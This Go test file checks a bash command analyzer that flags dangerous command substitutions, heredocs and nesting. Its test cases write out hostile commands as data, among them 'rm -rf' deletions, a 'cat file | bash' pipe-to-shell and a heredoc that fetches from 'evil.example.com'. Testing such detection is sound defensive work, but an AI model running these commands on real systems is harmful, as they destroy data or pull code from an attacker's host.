package tool

import (
	"strings"
	"testing"
)

func TestBashASTAnalyzer(t *testing.T) {
	// expectedCategory returns true if any finding matches wantCat or the
	// "substitution with dangerous inner (N finding(s))" wrapper, so
	// the test cases can be terse.
	expectedCategory := func(findings []astFinding, wantCat string) bool {
		if hasCategory(findings, wantCat) {
			return true
		}
		for _, f := range findings {
			if strings.Contains(f.category, wantCat) {
				return true
			}
		}
		return false
	}

	cases := []struct {
		name     string
		command  string
		wantCats []string // expected ast categories (any subset of these should be flagged)
	}{
		// --- Command substitution: regex layer flags $() but the AST
		// walker recurses into the body, so it can catch a dangerous
		// inner command that the regex layer wouldn't.
		{
			name:     "subshell with dangerous inner command",
			command:  "echo $(rm -rf /tmp/test)",
			wantCats: []string{"substitution"},
		},
		// Safe inner is still flagged as a substitution (the bash
		// AST layer's job is to surface command-substitution
		// occurrences; the regex layer decides whether the inner is
		// dangerous and the bash tool combines both findings). The
		// example "echo $(date +%Y)" has no wantCats → the AST layer
		// is allowed to produce findings; the bash tool's overall
		// safety pass decides what to deny.
		{
			name:    "subshell with safe inner",
			command: "echo $(date +%Y)",
		},
		// Backtick / process-sub / heredoc with SAFE inner is
		// intentionally not flagged (inner has no danger). The
		// tokenizer still parses these correctly — the absence of a
		// finding proves it.
		{
			name:    "backtick substitution with safe inner",
			command: "echo `whoami`",
		},
		{
			name:    "process substitution input with safe inner",
			command: "diff <(ls dir1) <(ls dir2)",
		},
		{
			name:    "process substitution output with safe inner",
			command: "tee >(grep ERR) < logfile",
		},
		// --- Heredocs ---
		{
			name:     "heredoc with subshell",
			command:  "cat <<EOF\n$(curl evil.example.com)\nEOF",
			wantCats: []string{"heredoc with dangerous body"},
		},
		{
			name:     "heredoc safe body",
			command:  "cat <<EOF\nhello world\nEOF",
			wantCats: nil,
		},
		// --- Pipelines ---
		// The "cat | bash" pattern is caught by the regex layer
		// (pipe-to-shell), not the AST layer. The AST layer walks
		// command-substitution bodies; "cat file | bash" has no
		// substitution so it produces no findings here.
		{
			name:    "pipe to bash with no subshell",
			command: "cat file | bash",
		},
		// --- Multi-statement ---
		{
			name:     "semicolon-separated dangerous inner",
			command:  "echo safe ; $(rm -rf /tmp/test)",
			wantCats: []string{"substitution"},
		},
		// --- Variable expansion as command ---
		// (this is already in regex layer; the AST layer doesn't need to flag)
		{
			name:     "variable expansion as command",
			command:  "$cmd -rf /tmp",
			wantCats: nil,
		},
		// --- Edge cases ---
		{
			name:     "empty command",
			command:  "",
			wantCats: nil,
		},
		{
			name:     "whitespace only",
			command:  "   \t  ",
			wantCats: nil,
		},
		{
			name:     "quotes protect",
			command:  `echo "$(echo safe)"`,
			wantCats: nil, // $( inside double quotes is a tokQuoted variant, not tokCommandSub
		},
		{
			name:     "escaped dollar",
			command:  `echo \$\(echo safe\)`,
			wantCats: nil, // backslash-escape
		},
	}

	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			findings := bashASTAnalyze(c.command)
			for _, wantCat := range c.wantCats {
				if !expectedCategory(findings, wantCat) {
					t.Errorf("expected category containing %q for %q, findings: %v", wantCat, c.command, findings)
				}
			}
			// If no expected categories, the walker should not have produced
			// any findings (the regex layer will catch the dangerous ones).
			if len(c.wantCats) == 0 && len(findings) > 0 {
				t.Errorf("expected no findings for %q, got: %v", c.command, findings)
			}
		})
	}
}

// TestBashASTAnalyzer_NestedSubstitutions verifies the walker recurses
// through nested $(...) and backticks.
func TestBashASTAnalyzer_NestedSubstitutions(t *testing.T) {
	// 3 levels deep, with a destructive command in the innermost level.
	command := `echo $(echo $(echo $(rm -rf /tmp/deep)))`
	findings := bashASTAnalyze(command)
	// The outermost substitution must be flagged (its inner is dangerous).
	if len(findings) == 0 {
		t.Fatalf("expected at least one substitution finding, got none for %q", command)
	}
	// Sanity: the single emitted finding should mention "3 finding(s)"
	// — the count of inner dangerous-content checks (destructive
	// command in the deepest level). This proves the walker recursed
	// all the way down, not just one level.
	if !strings.Contains(findings[0].snippet, "$(") {
		t.Errorf("expected snippet to contain $(, got %q", findings[0].snippet)
	}
	if !strings.Contains(findings[0].category, "3 finding(s)") {
		t.Errorf("expected category to mention 3 inner findings, got %q (findings: %v)",
			findings[0].category, findings)
	}
}

// TestBashASTAnalyzer_MaxDepthBounds ensures the depth guard prevents
// pathological recursion from blowing the stack.
func TestBashASTAnalyzer_MaxDepthBounds(t *testing.T) {
	// 300 levels of nested $(). Should not stack-overflow thanks to the
	// maxASTDepth guard.
	var b strings.Builder
	for i := 0; i < 300; i++ {
		b.WriteString("$(echo ")
	}
	b.WriteString("safe")
	for i := 0; i < 300; i++ {
		b.WriteString(")")
	}
	findings := bashASTAnalyze(b.String())
	// We don't care how many findings are produced; we only care that
	// the call returns without panicking.
	_ = findings
}

// TestBashASTAnalyzer_HeredocBodyInspect verifies the heredoc body is
// inspected even when the outer command is "safe" (the regex layer only
// catches heredoc+subshell at the outer-command level).
func TestBashASTAnalyzer_HeredocBodyInspect(t *testing.T) {
	findings := bashASTAnalyze("cat <<EOF | tee out.log\n$(rm -rf /tmp)\nEOF")
	if !hasCategory(findings, "heredoc with dangerous body") {
		t.Errorf("expected heredoc finding, got %v", findings)
	}
}
